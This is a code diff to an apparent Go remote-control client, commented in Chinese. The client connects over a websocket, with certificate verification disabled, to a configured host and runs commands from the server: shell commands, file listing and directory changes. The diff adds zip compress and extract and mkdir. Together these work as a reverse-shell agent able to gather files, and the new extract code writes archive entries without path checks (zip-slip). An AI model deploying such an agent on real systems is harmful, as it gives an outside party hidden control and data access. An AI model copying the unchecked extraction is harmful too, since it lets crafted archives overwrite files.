@@ -6,6 +6,7 @@
 package main
 
 import (
+	"archive/zip"
 	"bufio"
 	"crypto/tls"
 	"encoding/base64"
@@ -27,7 +28,7 @@ import (
 )
 
 const (
-	HOST               string = "192.168.1.39"
+	HOST               string = "127.0.0.1"
 	PORT               int    = 8765
 	INSECURESKIPVERIFY bool   = true
 )
@@ -214,6 +215,153 @@ func (e *ExecuteCommand) move_file(old_path, new_path string) string {
 	return "ok"
 }
 
+// 压缩文件
+func compress_file(old_path, new_path string) error {
+	old_file, err := os.Open(old_path)
+	if err != nil {
+		return err
+	}
+	defer old_file.Close()
+	new_file, err := os.Create(new_path)
+	if err != nil {
+		return err
+	}
+	defer new_file.Close()
+	writer := zip.NewWriter(new_file)
+	defer writer.Close()
+	file, err := writer.Create(filepath.Base(old_path))
+	if err != nil {
+		return err
+	}
+	_, err = io.Copy(file, old_file)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+// 压缩文件夹
+func compress_dir(old_path, new_path string) error {
+	zip_file, err := os.Create(new_path)
+	if err != nil {
+		return err
+	}
+	defer zip_file.Close()
+
+	writer := zip.NewWriter(zip_file)
+	defer writer.Close()
+
+	return filepath.Walk(old_path, func(filePath string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		// 获取相对路径，保持压缩包内的目录结构
+		relPath, err := filepath.Rel(old_path, filePath)
+		if err != nil {
+			return err
+		}
+
+		// 创建zip文件头
+		header, err := zip.FileInfoHeader(info)
+		if err != nil {
+			return err
+		}
+
+		// 设置压缩包内的路径
+		header.Name = relPath
+		if info.IsDir() {
+			header.Name += "/"
+		}
+
+		// 创建文件写入器
+		writer, err := writer.CreateHeader(header)
+		if err != nil {
+			return err
+		}
+
+		// 如果是文件，写入文件内容
+		if !info.IsDir() {
+			file, err := os.Open(filePath)
+			if err != nil {
+				return err
+			}
+			defer file.Close()
+			_, err = io.Copy(writer, file)
+			if err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+}
+
+// 压缩文件或文件夹
+func (e *ExecuteCommand) compress(old_path, new_path string) string {
+	file_info, err := os.Stat(old_path)
+	if err != nil {
+		return err.Error()
+	}
+	if file_info.IsDir() {
+		err = compress_dir(old_path, new_path)
+		if err != nil {
+			return err.Error()
+		}
+	} else {
+		err = compress_file(old_path, new_path)
+		if err != nil {
+			return err.Error()
+		}
+	}
+	return "ok"
+}
+
+// 解压文件
+func extract_file(old_path, new_path string) error {
+	if err := os.MkdirAll(new_path, 0755); err != nil {
+		return err
+	}
+	reader, err := zip.OpenReader(old_path)
+	if err != nil {
+		return err
+	}
+	defer reader.Close()
+	for _, file := range reader.File {
+		new_file_path := filepath.Join(new_path, file.Name)
+		if file.FileInfo().IsDir() {
+			err = os.MkdirAll(new_file_path, 0755)
+			if err != nil {
+				return err
+			}
+		} else {
+			new_file, err := os.Create(new_file_path)
+			if err != nil {
+				return err
+			}
+			defer new_file.Close()
+			old_file, err := file.Open()
+			if err != nil {
+				return err
+			}
+			defer old_file.Close()
+			_, err = io.Copy(new_file, old_file)
+			if err != nil {
+				return err
+			}
+		}
+	}
+	return nil
+}
+
+// 解压文件或文件夹
+func (e *ExecuteCommand) extract(old_path, new_path string) string {
+	err := extract_file(old_path, new_path)
+	if err != nil {
+		return err.Error()
+	}
+	return "ok"
+}
+
 // 执行命令并返回结果
 func (e *ExecuteCommand) execute_command(command string) map[string]interface{} {
 	host_info, _ := host.Info()
@@ -288,6 +436,15 @@ func (e *ExecuteCommand) get_file_list() map[string]interface{} {
 		}
 	}
 	return file_json
+}
+
+// 新建目录
+func (e *ExecuteCommand) create_directory(directory string) string {
+	err := os.Mkdir(directory, 0755)
+	if err != nil {
+		return err.Error()
+	}
+	return "ok"
 }
 
 // 更改当前工作目录
@@ -450,6 +607,24 @@ func client_loop() {
 					conn.Close()
 					break
 				}
+			} else if strings.HasPrefix(command, "compress") {
+				// 压缩文件或文件夹
+				file_info := command[len("compress:"):]
+				file_info_list := strings.SplitN(file_info, "(*.*)", 2)
+				message := Executecommand.compress(file_info_list[0], file_info_list[1])
+				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
+					conn.Close()
+					break
+				}
+			} else if strings.HasPrefix(command, "extract") {
+				// 解压文件
+				file_info := command[len("extract:"):]
+				file_info_list := strings.SplitN(file_info, "(*.*)", 2)
+				message := Executecommand.extract(file_info_list[0], file_info_list[1])
+				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
+					conn.Close()
+					break
+				}
 			} else if strings.HasPrefix(command, "command:") {
 				// 执行命令
 				command = command[len("command:"):]
@@ -466,9 +641,16 @@ func client_loop() {
 					conn.Close()
 					break
 				}
-			} else if strings.HasPrefix(command, "change_directory:") {
+			} else if strings.HasPrefix(command, "mkdir:") {
+				// 创建目录
+				directory := command[len("mkdir:"):]
+				result := Executecommand.create_directory(directory)
+				if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
+					conn.Close()
+				}
+			} else if strings.HasPrefix(command, "cd:") {
 				// 更改目录
-				directory := command[len("change_directory:"):]
+				directory := command[len("cd:"):]
 				result := Executecommand.change_directory(directory)
 				if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
 					conn.Close()
@@ -511,6 +693,11 @@ func client_loop() {
 				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
 					conn.Close()
 					break
+				}
+			} else {
+				// 未知命令
+				if err := conn.WriteMessage(websocket.TextMessage, []byte("Unknown command")); err != nil {
+					conn.Close()
 				}
 			}
 		}
